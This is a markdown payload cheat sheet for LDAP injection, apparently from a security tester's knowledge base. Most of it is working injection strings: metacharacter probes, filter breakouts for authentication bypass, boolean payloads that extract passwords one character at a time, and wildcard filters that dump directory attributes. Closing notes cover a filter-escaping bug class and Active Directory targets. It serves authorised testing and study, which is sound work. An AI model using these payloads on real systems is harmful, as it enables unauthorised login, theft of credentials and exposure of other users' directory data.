---
title: "Payloads: LDAP Injection"
type: payloads
tags: [payloads, ldap, injection, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-11
---

# Payloads: LDAP Injection

Inject into LDAP search filters (OWASP A03). Routed via the `hunt-injection` skill. See [[ldap-injection]].

## Detect
```
*        (         )        \        /        |        &        NUL
# error / different result count = injectable. Login field, search, user lookup.
```

## Auth bypass (filter is (&(user=INPUT)(pass=INPUT)))
```
*                          # user=* matches any
*)(uid=*))(|(uid=*         # break out, always-true
admin)(&)                  # comment-style: (&) is always true
admin)(!(&(1=0             #
*)(|(objectclass=*         # match all objects
user=*)(uid=*              #
```

## Blind extraction (boolean, char by char)
```
admin)(|(password=a*))     # true if password starts with 'a'
admin)(|(password=ab*))    # narrow
# iterate a-z0-9 per position; AND with a known-true to baseline
```

## Attribute enumeration / wildcards
```
*)(objectClass=*)          # dump classes
*)(mail=*)                 *)(memberOf=*)
admin)(description=*       # leak attributes via the filter
```

## Real-world
LDAP-backed login forms and address-book/user search are the targets; `*` and `*)(uid=*` style breakouts give auth bypass or full directory dump. Common in enterprise intranets and legacy SSO.

## NEW 2025-2026

1. **CVE-2026-90979 - filter-template substitution bug class**: LDAP filter templates
   (%u/%dn substitution) that escape ONLY backslash leave RFC 4515 metacharacters
   `*`, `(`, `)`, NUL injectable -> auth bypass + directory-wide matches. Audit any
   login flow that textually substitutes into a configured filter.
   https://nvd.nist.gov/vuln/detail/CVE-2026-90979
2. **Escaping ladder for filters**: `\2a` (*), `\28`/`\29` (parens), `\5c` (\),
   `\00` (NUL) - test the target's encoder by injecting each raw metachar and
   diffing the error/response.
3. **Blind LDAP via boolean filters**: `(|(uid=x)(attr=y*))` response differential =
   attribute-value oracle for slow data extraction from directory attributes
   (other users' attributes, group membership).
4. **AD-specific**: filter injection in AD LDS/ADAM endpoints and password-change
   lookups; pair `userPrincipalName` wildcards with lockout-policy checks (RoE:
   bounded attempts).
